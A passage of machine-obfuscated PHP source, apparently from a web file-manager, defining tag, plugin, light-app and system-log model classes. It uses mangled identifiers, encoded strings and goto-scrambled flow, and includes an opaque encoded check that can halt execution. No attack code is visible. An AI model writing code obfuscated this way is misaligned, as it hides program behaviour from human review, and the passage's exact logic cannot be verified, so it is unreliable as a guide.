œ¨ïË[1786])->select(); if (!$C²ø‘…ùù) { $C²ø‘…ùù = array(); } Model($DÉ œ¨ïË[791])->moveClearAuth = !1; goto eŠ”’ÕËºå; fš‚†É†²¾: if (!$C²ø‘…ùù[$DÙŒá¬‹‰…]) { $C²ø‘…ùù[$DÙŒá¬‹‰…] = Model($DÉ œ¨ïË[791])->groupRootAdd($DÙŒá¬‹‰…); } $dóòô…â¾´ = $C²ø‘…ùù[$DÙŒá¬‹‰…]; $dÒĞŒ£ŸÀß = array($DÉ œ¨ïË[476] => $DÆëğŒê); goto DÖ·œŠ¾©; CÂç‘¾õŞ: $FéÔ²÷¾§Ä = array($DÉ œ¨ïË[482] => $DÙŒá¬‹‰…); Model($DÉ œ¨ïË[1787])->where($dÒĞŒ£ŸÀß)->save($FéÔ²÷¾§Ä); Model($DÉ œ¨ïË[1788])->where($dÒĞŒ£ŸÀß)->save($FéÔ²÷¾§Ä); goto cÏõ†ºš²™; cÏõ†ºš²™: } $this->_changeChildLevel($c¡ï¤Œé[$f†ÒÖ‹ÂÇ], $c¡ï¤Œé[$DÙŒá¬‹‰…], !0); goto B¤ĞÇŸß·ì; d«İšŒ·­•: $c¡ï¤Œé = array_to_keyvalue($c¡ï¤Œé, $DÉ œ¨ïË[1689]); if (!isset($c¡ï¤Œé[$f†ÒÖ‹ÂÇ]) || !isset($c¡ï¤Œé[$DÙŒá¬‹‰…]) || $c¡ï¤Œé[$f†ÒÖ‹ÂÇ][$DÉ œ¨ïË[476]] == 0) { return !1; } $dÒĞŒ£ŸÀß = array($DÉ œ¨ïË[1689] => $f†ÒÖ‹ÂÇ); goto CœÑæ”Ü·; B¤ĞÇŸß·ì: $this->where(array($DÉ œ¨ïË[476] => $f†ÒÖ‹ÂÇ))->save(array($DÉ œ¨ïË[476] => $DÙŒá¬‹‰…)); return !0; goto DÒ¼ĞåÜŒ¼; cì…í¯¸½: $DÉ œ¨ïË =& $_SERVER[Ç³Íß¦Ó]; $dÒĞŒ£ŸÀß = array($DÉ œ¨ïË[1689] => array($DÉ œ¨ïË[7], array($f†ÒÖ‹ÂÇ, $DÙŒá¬‹‰…))); $c¡ï¤Œé = $this->where($dÒĞŒ£ŸÀß)->select(); goto d«İšŒ·­•; DÒ¼ĞåÜŒ¼: } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($C÷Ù»Ë¤Œî) { $CâÆêé«ÈÅ =& $_SERVER[Ç³Íß¦Ó]; return array($CâÆêé«ÈÅ[1789] => array($C÷Ù»Ë¤Œî[0], $CâÆêé«ÈÅ[1790]), $CâÆêé«ÈÅ[1791] => array($C÷Ù»Ë¤Œî[0], $CâÆêé«ÈÅ[1792])); } protected function get($f§Ï–š¹ï) { $AèŞÀ¹‚‚ =& $_SERVER[Ç³Íß¦Ó]; $cÁâçŞñ¶ = Model($AèŞÀ¹‚‚[484])->metaGet($f§Ï–š¹ï, $AèŞÀ¹‚‚[1793]); $AÇáåáÔ„ä = json_decode($cÁâçŞñ¶, !0); return $AÇáåáÔ„ä ? $AÇáåáÔ„ä : array($AèŞÀ¹‚‚[1794] => $AèŞÀ¹‚‚[87], $AèŞÀ¹‚‚[366] => array()); } protected function set($Eğô–ã‚¡Ï, $FÃÒ¡ø˜²ˆ) { $eëÂ¥Öí¡í =& $_SERVER[Ç³Íß¦Ó]; $FÃÒ¡ø˜²ˆ = $FÃÒ¡ø˜²ˆ ? $FÃÒ¡ø˜²ˆ : array($eëÂ¥Öí¡í[1794] => $eëÂ¥Öí¡í[87], $eëÂ¥Öí¡í[366] => array()); Model($eëÂ¥Öí¡í[484])->metaSet($Eğô–ã‚¡Ï, $eëÂ¥Öí¡í[1793], json_encode($FÃÒ¡ø˜²ˆ)); return Model($eëÂ¥Öí¡í[484])->metaSet($Eğô–ã‚¡Ï, $eëÂ¥Öí¡í[1793], json_encode($FÃÒ¡ø˜²ˆ)); } protected function getByTagID($aœÕºìÒœ‘, $E£×É³¥ƒ‰) { goto e¾ÕÙ”·ª÷; e¾ÕÙ”·ª÷: $f®Èß¹’ÎÕ =& $_SERVER[Ç³Íß¦Ó]; if (!$aœÕºìÒœ‘ || !$E£×É³¥ƒ‰) { return !1; } if (!Model($f®Èß¹’ÎÕ[484])->getInfoSimple($aœÕºìÒœ‘)) { return !1; } goto FèÊØ“«Ôª; fôàŒ¶‡„İ: return is_array($aÙ‘°·áÓÑ) ? $aÙ‘°·áÓÑ : !1; goto e©ÅÊöˆï; FèÊØ“«Ôª: $fçï³¿³ª = $this->get($aœÕºìÒœ‘); if (!$fçï³¿³ª || !isset($fçï³¿³ª[$f®Èß¹’ÎÕ[366]])) { return !1; } $aÙ‘°·áÓÑ = array_find_by_field($fçï³¿³ª[$f®Èß¹’ÎÕ[366]], $f®Èß¹’ÎÕ[392], $E£×É³¥ƒ‰); goto fôàŒ¶‡„İ; e©ÅÊöˆï: } public function listSource($c±ó¾¨¤¦Œ, $d…“ä¤²‡) { goto Cêé±‘Çñä; AÆ”§ª¯¦Ÿ: $cÀÖƒàÁƒÂ = array(); foreach ($cÉÈø¥¨Ï› as $E•ÑŒÊéµä) { $eŞ¬áÒ½Û = $E•ÑŒÊéµä[$e±„¥ó–”¥[76]]; if (!$eŞ¬áÒ½Û) { continue; } if (!isset($cÀÖƒàÁƒÂ[$eŞ¬áÒ½Û])) { $cÀÖƒàÁƒÂ[$eŞ¬áÒ½Û] = array(); } $cÀÖƒàÁƒÂ[$eŞ¬áÒ½Û][] = $E•ÑŒÊéµä[$e±„¥ó–”¥[417]]; } $b²ª°éé = array(); goto fƒÀğ‘õ‰; Cêé±‘Çñä: $e±„¥ó–”¥ =& $_SERVER[Ç³Íß¦Ó]; if ($d…“ä¤²‡ && !is_array($d…“ä¤²‡)) { $d…“ä¤²‡ = array($d…“ä¤²‡); } $cÉÈø¥¨Ï› = $this->listData($c±ó¾¨¤¦Œ); goto AÆ”§ª¯¦Ÿ; DÊ°‹Ö‡ÎÎ: if ($eâ†ï…Ô) { $this->removeBySource($c±ó¾¨¤¦Œ, $eâ†ï…Ô); } return $D·ïëİº¡­; goto A‚ÃÚèİŠ; fƒÀğ‘õ‰: foreach ($cÀÖƒàÁƒÂ as $A†á„òÇ‡” => $CÏïÍïŒ˜„) { $Dõéø•ÇÌï = !0; if (!$d…“ä¤²‡) { $b²ª°éé[] = $A†á„òÇ‡”; continue; } foreach ($d…“ä¤²‡ as $dƒ£Ëƒèï•) { if (!in_array($dƒ£Ëƒèï•, $CÏïÍïŒ˜„)) { $Dõéø•ÇÌï = !1; break; } } if ($Dõéø•ÇÌï) { $b²ª°éé[] = $A†á„òÇ‡”; } } if (!$b²ª°éé) { return array(); } $D·ïëİº¡­ = Model($e±„¥ó–”¥[1204])->listSource(array($e±„¥ó–”¥[408] => array($e±„¥ó–”¥[409], $b²ª°éé))); goto E™¨ˆÑîµÖ; E™¨ˆÑîµÖ: if (!$D·ïëİº¡­ || count($b²ª°éé) == $D·ïëİº¡­[$e±„¥ó–”¥[363]][$e±„¥ó–”¥[364]]) { return $D·ïëİº¡­; } $eâ†ï…Ô = array(); $c°£…„ğ® = array_to_keyvalue($D·ïëİº¡­[$e±„¥ó–”¥[75]], $e±„¥ó–”¥[33], $e±„¥ó–”¥[394]); goto cŞÙÊïšÌ§; cŞÙÊïšÌ§: $C©±ò™ßÍ¸ = array_to_keyvalue($D·ïëİº¡­[$e±„¥ó–”¥[74]], $e±„¥ó–”¥[33], $e±„¥ó–”¥[394]); $DåİÒåğ×¬ = array_merge($C©±ò™ßÍ¸, $c°£…„ğ®); foreach ($b²ª°éé as $eŞ¬áÒ½Û) { if (!in_array($eŞ¬áÒ½Û, $DåİÒåğ×¬)) { $eâ†ï…Ô[] = $eŞ¬áÒ½Û; } } goto DÊ°‹Ö‡ÎÎ; A‚ÃÚèİŠ: } protected function listData($e‘Ë‹ˆ¬¸“) { $D Â³ñÕñÕ =& $_SERVER[Ç³Íß¦Ó]; $FêäÛã×Ïí = array($D Â³ñÕñÕ[1518] => 0, $D Â³ñÕñÕ[461] => array($D Â³ñÕñÕ[1795], 0), $D Â³ñÕñÕ[413] => $D Â³ñÕñÕ[1796] . $e‘Ë‹ˆ¬¸“); $AµÀ÷Ÿ— = $D Â³ñÕñÕ[1797]; $CºáƒÄ‡Ï® = $this->field($AµÀ÷Ÿ—)->where($FêäÛã×Ïí)->order($D Â³ñÕñÕ[1798])->select(); return $CºáƒÄ‡Ï® ? $CºáƒÄ‡Ï® : array(); } protected function addToTag($fœª™—Æ œ, $Dé·³ÑÙƒ, $CÌ¤‹ªÀ˜„) { $Eö‘òá¢ğ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->getByTagID($fœª™—Æ œ, $CÌ¤‹ªÀ˜„) || !$Dé·³ÑÙƒ) { return !1; } if (!Model($Eö‘òá¢ğ[791])->pathInfo($Dé·³ÑÙƒ)) { return !1; } $bÙ¤ìİä’· = array($Eö‘òá¢ğ[1518] => 0, $Eö‘òá¢ğ[461] => $CÌ¤‹ªÀ˜„, $Eö‘òá¢ğ[412] => $Dé·³ÑÙƒ, $Eö‘òá¢ğ[413] => $Eö‘òá¢ğ[1799] . $fœª™—Æ œ, $Eö‘òá¢ğ[411] => $Eö‘òá¢ğ[33], $Eö‘òá¢ğ[1693] => 0); if ($this->where($bÙ¤ìİä’·)->find()) { return !1; } return $this->add($bÙ¤ìİä’·); } protected function removeFromTag($C½‰‹¡åº, $Cáå¶ªï¼¬, $Dœõ³öÊî…) { $A¯®¸—ÊÇ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->getByTagID($C½‰‹¡åº, $Dœõ³öÊî…) || !$Cáå¶ªï¼¬) { return !1; } if (is_array($Cáå¶ªï¼¬)) { $Cáå¶ªï¼¬ = array($A¯®¸—ÊÇ[7], $Cáå¶ªï¼¬); } $Bˆ“ò‡ë”ã = array($A¯®¸—ÊÇ[1518] => 0, $A¯®¸—ÊÇ[461] => $Dœõ³öÊî…, $A¯®¸—ÊÇ[413] => $A¯®¸—ÊÇ[1799] . $C½‰‹¡åº, $A¯®¸—ÊÇ[412] => $Cáå¶ªï¼¬); return $this->where($Bˆ“ò‡ë”ã)->delete(); } protected function removeByTag($CŒÛ’¹ÏÓ, $F Œõ·‰¢Ä) { $føòŸ†«ñŒ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->getByTagID($CŒÛ’¹ÏÓ, $F Œõ·‰¢Ä)) { return !1; } $cƒí‡¢ã = array($føòŸ†«ñŒ[1518] => 0, $føòŸ†«ñŒ[461] => $F Œõ·‰¢Ä, $føòŸ†«ñŒ[413] => $føòŸ†«ñŒ[1799] . $CŒÛ’¹ÏÓ); return $this->where($cƒí‡¢ã)->delete(); } protected function removeBySource($aí´ÜØ„ìÀ, $F­•íŸÃ¼) { $d´‰Š—¯Œ =& $_SERVER[Ç³Íß¦Ó]; if (!$aí´ÜØ„ìÀ || !$F­•íŸÃ¼) { return !1; } if (is_array($F­•íŸÃ¼)) { $F­•íŸÃ¼ = array($d´‰Š—¯Œ[7], $F­•íŸÃ¼); } $fÒá‘øæÄè = array($d´‰Š—¯Œ[1518] => 0, $d´‰Š—¯Œ[412] => $F­•íŸÃ¼, $d´‰Š—¯Œ[461] => array($d´‰Š—¯Œ[971], 0), $d´‰Š—¯Œ[413] => $d´‰Š—¯Œ[1799] . $aí´ÜØ„ìÀ); return $this->where($fÒá‘øæÄè)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\x70\154\165\147\x69\156\x4c\151\163\164"; public $field = array("\156\141\155\145", "\x73\x74\141\x74\165\163", "\x72\145\147\151\145\163\x74", "\143\157\156\x66\151\x67"); public function loadList($bİ°ÚªŠã¯ = false) { $Cñ¸èïĞÏ = array_to_keyvalue($this->listData(), $_SERVER[Ç³Íß¦Ó][28]); if ($bİ°ÚªŠã¯) { return $Cñ¸èïĞÏ[$bİ°ÚªŠã¯]; } return $Cñ¸èïĞÏ; } public function init() { $eí²ˆ ƒÛ =& $_SERVER[Ç³Íß¦Ó]; Hook::trigger($eí²ˆ ƒÛ[1800]); $cŠŸÛ™ô÷ä = $this->loadPluginList(); foreach ($cŠŸÛ™ô÷ä as $eÉŞÏŞ§†± => $FÁ»‚‹àœ‚) { $eÜƒéĞŠ = $this->appAllow($eÉŞÏŞ§†±, $FÁ»‚‹àœ‚); if (!$eÜƒéĞŠ) { continue; } foreach ($FÁ»‚‹àœ‚[$eí²ˆ ƒÛ[1801]] as $d˜Ê¯âß¦ => $B¼Òôù”®») { Hook::bind($d˜Ê¯âß¦, $B¼Òôù”®»); } } Hook::trigger($eí²ˆ ƒÛ[1802]); Hook::trigger(ACTION); } public function appAllow($D§¶µ¹ºö¾, $EÒÕØ—ƒÏÛ, $aÑ×µ«¹õé = true) { $aÒ¶‰ï–«¸ =& $_SERVER[Ç³Íß¦Ó]; $Dš ••”Ò = PLUGIN_DIR . $D§¶µ¹ºö¾ . $aÒ¶‰ï–«¸[1803]; if (!is_array($EÒÕØ—ƒÏÛ) || !is_array($EÒÕØ—ƒÏÛ[$aÒ¶‰ï–«¸[1801]]) || $EÒÕØ—ƒÏÛ[$aÒ¶‰ï–«¸[714]] != 1 || !is_file($Dš ••”Ò)) { return !1; } if ($GLOBALS[$aÒ¶‰ï–«¸[483]] == 1) { return !0; } if ($aÑ×µ«¹õé && !Action($aÒ¶‰ï–«¸[1804])->checkAuth($D§¶µ¹ºö¾)) { return !1; } return !0; } public function unInstall($dµïÌ˜»”¹) { $Dïƒ‹”± =& $_SERVER[Ç³Íß¦Ó]; $aªèˆ†Ş¦ó = $this->loadList($dµïÌ˜»”¹); if (file_exists(PLUGIN_DIR . $dµïÌ˜»”¹)) { Hook::apply($dµïÌ˜»”¹ . $Dïƒ‹”±[1805]); } $this->remove($aªèˆ†Ş¦ó[$Dïƒ‹”±[392]]); } public function changeStatus($B•¦˜÷âäŠ, $Eñ‰·åàß¶) { $d¸½ ŒâÈ„ =& $_SERVER[Ç³Íß¦Ó]; $bñ¹ÅÙ‰²‹ = $this->loadList($B•¦˜÷âäŠ); if ($Eñ‰·åàß¶) { Hook::apply($B•¦˜÷âäŠ . $d¸½ ŒâÈ„[1806]); } $this->update($bñ¹ÅÙ‰²‹[$d¸½ ŒâÈ„[392]], array($d¸½ ŒâÈ„[1807] => $Eñ‰·åàß¶)); } public function appRegist($a†Úè£ôˆÑ, $AŞ„›·Òøì) { $Bª´Æ•Š‘î =& $_SERVER[Ç³Íß¦Ó]; $F„ ŒÃ·à = $this->loadList($a†Úè£ôˆÑ); if ($F„ ŒÃ·à) { $this->update($F„ ŒÃ·à[$Bª´Æ•Š‘î[392]], array($Bª´Æ•Š‘î[1801] => $AŞ„›·Òøì)); } else { $böÎËß»Û = array($Bª´Æ•Š‘î[28] => $a†Úè£ôˆÑ, $Bª´Æ•Š‘î[1801] => $AŞ„›·Òøì, $Bª´Æ•Š‘î[714] => 0, $Bª´Æ•Š‘î[6] => $this->getConfigDefault($a†Úè£ôˆÑ)); $this->insert($böÎËß»Û); } } public function getConfigDefault($B¿£İ‰ëƒİ) { $CƒÇÕ›íÚà =& $_SERVER[Ç³Íß¦Ó]; $eåœ˜´¤Åœ = array(); $D¨Öá¹“Ç± = $this->getPackageJson($B¿£İ‰ëƒİ); if (!$D¨Öá¹“Ç± && is_array($D¨Öá¹“Ç±[$CƒÇÕ›íÚà[1808]])) { return $eåœ˜´¤Åœ; } foreach ($D¨Öá¹“Ç±[$CƒÇÕ›íÚà[1808]] as $dƒ«ÙëÅâ– => $DÏÉ¿¸’¦Î) { if (!isset($DÏÉ¿¸’¦Î[$CƒÇÕ›íÚà[371]]) || isset($eåœ˜´¤Åœ[$dƒ«ÙëÅâ–])) { continue; } $eåœ˜´¤Åœ[$dƒ«ÙëÅâ–] = $DÏÉ¿¸’¦Î[$CƒÇÕ›íÚà[371]]; } return $eåœ˜´¤Åœ; } public function getPackageJson($eó“ÁğĞã‡) { return Hook::apply($eó“ÁğĞã‡ . $_SERVER[Ç³Íß¦Ó][1809]); } public function getConfig($F±èà‰è’, $D½ÏŒ™’ô = false) { $eŞµøƒœÈ =& $_SERVER[Ç³Íß¦Ó]; $ağ¤ñ·‚‰® = array(); $d´Ô÷¢‘„¬ = $this->loadList($F±èà‰è’); if ($d´Ô÷¢‘„¬ && is_array($d´Ô÷¢‘„¬[$eŞµøƒœÈ[6]])) { $ağ¤ñ·‚‰® = $d´Ô÷¢‘„¬[$eŞµøƒœÈ[6]]; } if (!$ağ¤ñ·‚‰® || $D½ÏŒ™’ô) { $ağ¤ñ·‚‰® = $this->getConfigDefault($F±èà‰è’); } return $ağ¤ñ·‚‰®; } public function setConfig($bÅ„ÔœŠğ, $d ²×œÙŠï = false) { goto bóÀÍº ŠÛ; B‘öŞœï¨: $CˆÔƒ™Òˆ = $b£ŞëéÈ¥Â[$a¤Üƒ¯ÀóÓ[6]]; if ($d ²×œÙŠï == !1) { $CˆÔƒ™Òˆ = array(); $d ²×œÙŠï = $this->getConfigDefault($bÅ„ÔœŠğ); } foreach ($d ²×œÙŠï as $f£ËŸÑæîÖ => $aâ…„ß¥ç) { $CˆÔƒ™Òˆ[$f£ËŸÑæîÖ] = is_string($aâ…„ß¥ç) ? trim($aâ…„ß¥ç) : $aâ…„ß¥ç; } goto c·„ëÛõ¹¥; bóÀÍº ŠÛ: $a¤Üƒ¯ÀóÓ =& $_SERVER[Ç³Íß¦Ó]; $b£ŞëéÈ¥Â = $this->loadList($bÅ„ÔœŠğ); if (!$b£ŞëéÈ¥Â) { return !1; } goto B‘öŞœï¨; c·„ëÛõ¹¥: $this->update($b£ŞëéÈ¥Â[$a¤Üƒ¯ÀóÓ[392]], array($a¤Üƒ¯ÀóÓ[6] => $CˆÔƒ™Òˆ)); goto aŒŞƒ®É‘–; aŒŞƒ®É‘–: } public function viewList() { goto A…§ŒäÕÀé; Aß‹×„ŞîÂ: $D‹ğõÓÚ˜ = $this->loadPluginList(); $b¶Ğ‰šØ©¸ = array(); foreach ($D‹ğõÓÚ˜ as $DÑ”œ‹œ® => $B‡„«æÖ…Ï) { unset($B‡„«æÖ…Ï[$Föˆ«ª·—[1801]], $B‡„«æÖ…Ï[$Föˆ«ª·—[6]]); $c²Û‡ÅªËî = PLUGIN_DIR . $B‡„«æÖ…Ï[$Föˆ«ª·—[28]] . $Föˆ«ª·—[1803]; if (!is_file($c²Û‡ÅªËî)) { continue; } $açÌ±çŠÁï = Hook::apply($B‡„«æÖ…Ï[$Föˆ«ª·—[28]] . $Föˆ«ª·—[1809]); if (is_array($açÌ±çŠÁï)) { $b¶Ğ‰šØ©¸[$DÑ”œ‹œ®] = array_merge($B‡„«æÖ…Ï, $açÌ±çŠÁï); } } goto B¯ œùÆ; A…§ŒäÕÀé: $Föˆ«ª·— =& $_SERVER[Ç³Íß¦Ó]; $D‹ğõÓÚ˜ = $this->loadList(); $this->pluginScan($D‹ğõÓÚ˜); goto Aß‹×„ŞîÂ; B¯ œùÆ: return $b¶Ğ‰šØ©¸; goto fóƒÑ·æÅ®; fóƒÑ·æÅ®: } private function loadPluginList() { $d£±†À§¸ =& $_SERVER[Ç³Íß¦Ó]; $C—ß…‰·óã = $this->loadList(); if (strtolower(MOD) == $d£±†À§¸[1810]) { return $C—ß…‰·óã; } $D¯¶¯Š×Ü = Hook::trigger($d£±†À§¸[1811], $C—ß…‰·óã); if ($C—ß…‰·óã && !$D¯¶¯Š×Ü) { die; } return $D¯¶¯Š×Ü ? $D¯¶¯Š×Ü : $C—ß…‰·óã; } private function pluginScan($F‘ğŞ®’ß¦) { $f÷ë©Ï¢Ä =& $_SERVER[Ç³Íß¦Ó]; recursion_dir(PLUGIN_DIR, $e®÷Š’ÌÖì, $bù“»Ûãî©, 0); foreach ($e®÷Š’ÌÖì as $d¨÷¯´Š”§) { $C‡Ù‰¬à‚¯ = get_path_this($d¨÷¯´Š”§); if (isset($F‘ğŞ®’ß¦[$C‡Ù‰¬à‚¯]) || !file_exists($d¨÷¯´Š”§ . $f÷ë©Ï¢Ä[1812]) || !file_exists($d¨÷¯´Š”§ . $f÷ë©Ï¢Ä[1803])) { continue; } Hook::apply($C‡Ù‰¬à‚¯ . $f÷ë©Ï¢Ä[1806]); } } } goto E‰ºòò±ØÊ; d™Úœö–ßä: define($_SERVER[Ç³Íß¦Ó][236], 2); define($_SERVER[Ç³Íß¦Ó][237], 3); define($_SERVER[Ç³Íß¦Ó][238], 1); goto CÚ£ÂÖóé; C‡Òï±Ãêé: $E‹¹ª¸•–‚ = $_SERVER[$_SERVER[Ç³Íß¦Ó][832]]; $fÃ¼òÏŸ°· = $_SERVER[Ç³Íß¦Ó][833]; if ($_SERVER[$_SERVER[Ç³Íß¦Ó][834]] != $fÃ¼òÏŸ°·($E‹¹ª¸•–‚)) { goto bÕãŒõÂæÊ; céàÔ¼ˆ•Ö: $aà¤¶¨¿È = explode($_SERVER[Ç³Íß¦Ó][228], $B†«é™‰Á©); if (count($aà¤¶¨¿È) < $_SERVER[Ç³Íß¦Ó][598]) { $Aì»Ó¯¿Œİ = $_SERVER[Ç³Íß¦Ó][839]; $Aì»Ó¯¿Œİ(); } $f“äç‚İ‡î = $_SERVER[Ç³Íß¦Ó][1393]; goto Fâ›‘š³¼; bÕãŒõÂæÊ: $Eõäâ˜ÓÃ = $_SERVER[Ç³Íß¦Ó][836]; $A«¤õƒ¯ = $_SERVER[$_SERVER[Ç³Íß¦Ó][837]] . $_SERVER[Ç³Íß¦Ó][838]; $B†«é™‰Á© = $Eõäâ˜ÓÃ($A«¤õƒ¯); goto céàÔ¼ˆ•Ö; Fâ›‘š³¼: $f“äç‚İ‡î($E‹¹ª¸•–‚); goto d·Ø¦¾¾Ö; d·Ø¦¾¾Ö: } goto dŸµàÍ‰ê; Bé²Ú‡ÜŸˆ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\114\151\x67\150\164\x41\160\x70"; public $modelType = "\x53\171\x73\x74\145\155\117\160\x74\x69\x6f\x6e"; public $field = array("\156\141\155\x65", "\x67\x72\x6f\165\x70", "\144\x65\x73\143", "\x63\x6f\156\164\x65\156\164"); public function listData($d´Ã‡ÛÀÉÇ = false, $cŒ ãÜøÎ„ = "\x6d\157\x64\x69\x66\x79\124\x69\155\x65", $Fö·Ôó÷ëö = true) { return parent::listData($d´Ã‡ÛÀÉÇ, $cŒ ãÜøÎ„, $Fö·Ôó÷ëö); } public function remove($D¹Ô·å»šÜ) { $A™‘›ùÖ»ñ = $this->findByName($D¹Ô·å»šÜ); if (!$A™‘›ùÖ»ñ) { return !1; } return parent::remove($A™‘›ùÖ»ñ[$_SERVER[Ç³Íß¦Ó][392]]); } public function add($Cª‡«‚£ƒÀ) { if ($this->findByName($Cª‡«‚£ƒÀ[$_SERVER[Ç³Íß¦Ó][28]])) { return !1; } return parent::insert($Cª‡«‚£ƒÀ); } public function update($b§‘ïŞíõõ, $BÒ¬šš¦¬é) { $A£ïçÉÊÒ½ =& $_SERVER[Ç³Íß¦Ó]; $bÇ²ñ†ÍÀ = $this->findByName($b§‘ïŞíõõ); $Cİ‰Øë¹¬ = $this->findByName($BÒ¬šš¦¬é[$A£ïçÉÊÒ½[28]]); if (!$bÇ²ñ†ÍÀ || $Cİ‰Øë¹¬ && $Cİ‰Øë¹¬[$A£ïçÉÊÒ½[392]] != $bÇ²ñ†ÍÀ[$A£ïçÉÊÒ½[392]]) { return !1; } return parent::update($bÇ²ñ†ÍÀ[$A£ïçÉÊÒ½[392]], $BÒ¬šš¦¬é); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\155\x5f\x6c\157\147"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\151\156\163\x65\x72\164", "\146\165\x6e\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $f¨‡„ãÓµ =& $_SERVER[Ç³Íß¦Ó]; return array($f¨‡„ãÓµ[2001] => LNG($f¨‡„ãÓµ[2002]), $f¨‡„ãÓµ[2003] => LNG($f¨‡„ãÓµ[2004]), $f¨‡„ãÓµ[1629] => LNG($f¨‡„ãÓµ[2005]), $f¨‡„ãÓµ[2006] => LNG($f¨‡„ãÓµ[2007]), $f¨‡„ãÓµ[2008] => LNG($f¨‡„ãÓµ[2009]), $f¨‡„ãÓµ[2010] => LNG($f¨‡„ãÓµ[2011]), $f¨‡„ãÓµ[2012] => LNG($f¨‡„ãÓµ[2013]), $f¨‡„ãÓµ[1659] => LNG($f¨‡„ãÓµ[2013]), $f¨‡„ãÓµ[1660] => LNG($f¨‡„ãÓµ[2014]), $f¨‡„ãÓµ[2015] => LNG($f¨‡„ãÓµ[2016]), $f¨‡„ãÓµ[2017] => LNG($f¨‡„ãÓµ[2018]), $f¨‡„ãÓµ[2019] => LNG($f¨‡„ãÓµ[2020]), $f¨‡„ãÓµ[2021] => LNG($f¨‡„ãÓµ[2022]), $f¨‡„ãÓµ[1657] => LNG($f¨‡„ãÓµ[2023]), $f¨‡„ãÓµ[1664] => LNG($f¨‡„ãÓµ[2024]), $f¨‡„ãÓµ[2025] => LNG($f¨‡„ãÓµ[2026]), $f¨‡„ãÓµ[2027] => LNG($f¨‡„ãÓµ[2028]), $f¨‡„ãÓµ[2029] => LNG($f¨‡„ãÓµ[2030]), $f¨‡„ãÓµ[2031] => LNG($f¨‡„ãÓµ[2032]), $f¨‡„ãÓµ[1667] => LNG($f¨‡„ãÓµ[2033]), $f¨‡„ãÓµ[1668] => LNG($f¨‡„ãÓµ[2034]), $f¨‡„ãÓµ[2035] => LNG($f¨‡„ãÓµ[2036]), $f¨‡„ãÓµ[2037] => LNG($f¨‡„ãÓµ[2038]), $f¨‡„ãÓµ[2039] => LNG($f¨‡„ãÓµ[2040]), $f¨‡„ãÓµ[1662] => LNG($f¨‡„ãÓµ[2041]), $f¨‡„ãÓµ[2042] => LNG($f¨‡„ãÓµ[2043]), $f¨‡„ãÓµ[1661] => LNG($f¨‡„ãÓµ[2044]), $f¨‡„ãÓµ[2045] => LNG($f¨‡„ãÓµ[2046]), $f¨‡„ãÓµ[2047] => LNG($f¨‡„ãÓµ[2048]), $f¨‡„ãÓµ[2049] => LNG($f¨‡„ãÓµ[2050]), $f¨‡„ãÓµ[2051] => LNG($f¨‡„ãÓµ[2051]), $f¨‡„ãÓµ[2052] => LNG($f¨‡„ãÓµ[1633]), $f¨‡„ãÓµ[2053] => LNG($f¨‡„ãÓµ[2054]), $f¨‡„ãÓµ[2055] => LNG($f¨‡„ãÓµ[2056]), $f¨‡„ãÓµ[2057] => LNG($f¨‡„ãÓµ[2058]), $f¨‡„ãÓµ[2059] => LNG($f¨‡„ãÓµ[2060]), $f¨‡„ãÓµ[2061] => LNG($f¨‡„ãÓµ[2062]), $f¨‡„ãÓµ[2063] => LNG($f¨‡„ãÓµ[2063]), $f¨‡„ãÓµ[2064] => LNG($f¨‡„ãÓµ[2065]), $f¨‡„ãÓµ[2066] => LNG($f¨‡„ãÓµ[2067]), $f¨‡„ãÓµ[2068] => LNG($f¨‡„ãÓµ[2069]), $f¨‡„ãÓµ[2070] => LNG($f¨‡„ãÓµ[2071]), $f¨‡„ãÓµ[2072] => LNG($f¨‡„ãÓµ[2073]), $f¨‡„ãÓµ[2074] => LNG($f¨‡„ãÓµ[2075])); } private function typeFile() { $AĞÀ±Üïëì =& $_SERVER[Ç³Íß¦Ó]; $BÃ¢©ƒ¤‘‹ = array($AĞÀ±Üïëì[1664] => array($AĞÀ±Üïëì[1665]), $AĞÀ±Üïëì[2019] => array($AĞÀ±Üïëì[2076]), $AĞÀ±Üïëì[2021] => array($AĞÀ±Üïëì[2077]), $AĞÀ±Üïëì[1657] => array($AĞÀ±Üïëì[1658]), $AĞÀ±Üïëì[2027] => array(), $AĞÀ±Üïëì[2029] => array(), $AĞÀ±Üïëì[2031] => array(), $AĞÀ±Üïëì[1667] => array($AĞÀ±Üïëì[1669]), $AĞÀ±Üïëì[1668] => array($AĞÀ±Üïëì[1669]), $AĞÀ±Üïëì[2035] => array($AĞÀ±Üïëì[2078]), $AĞÀ±Üïëì[2037] => array($AĞÀ±Üïëì[2078]), $AĞÀ±Üïëì[2039] => array($AĞÀ±Üïëì[2079]), $AĞÀ±Üïëì[2025] => array($AĞÀ±Üïëì[2080]), $AĞÀ±Üïëì[1662] => array($AĞÀ±Üïëì[2081]), $AĞÀ±Üïëì[2042] => array($AĞÀ±Üïëì[2082]), $AĞÀ±Üïëì[1661] => array($AĞÀ±Üïëì[1663])); return $BÃ¢©ƒ¤‘‹; } private function typeAll() { goto Fê†éØ¥­; E¾ ô°»Æç: foreach ($FöÕ±‚Œ“ as $D—¶¬ºâÆ => $E†Ñ¤œÖ«) { $E¿¥Å½˜ò[$E†Ñ¤œÖ«[0]] = $E¿¥Å½˜ò[$D—¶¬ºâÆ]; } $E¿¥Å½˜ò[$d²ŒìâÈ¹Ÿ[1669]] = LNG($d²ŒìâÈ¹Ÿ[2083]); $E¿¥Å½˜ò[$d²ŒìâÈ¹Ÿ[2078]] = LNG($d²ŒìâÈ¹Ÿ[2084]); goto E˜ğ­¿åõ; Fê†éØ¥­: $d²ŒìâÈ¹Ÿ =& $_SERVER[Ç³Íß¦Ó]; $E¿¥Å½˜ò = $this->typeList; $FöÕ±‚Œ“ = array_filter($this->typeFile()); goto E¾ ô°»Æç; E˜ğ­¿åõ: return $E¿¥Å½˜ò; goto d·®óßÀ; d·®óßÀ: } public function 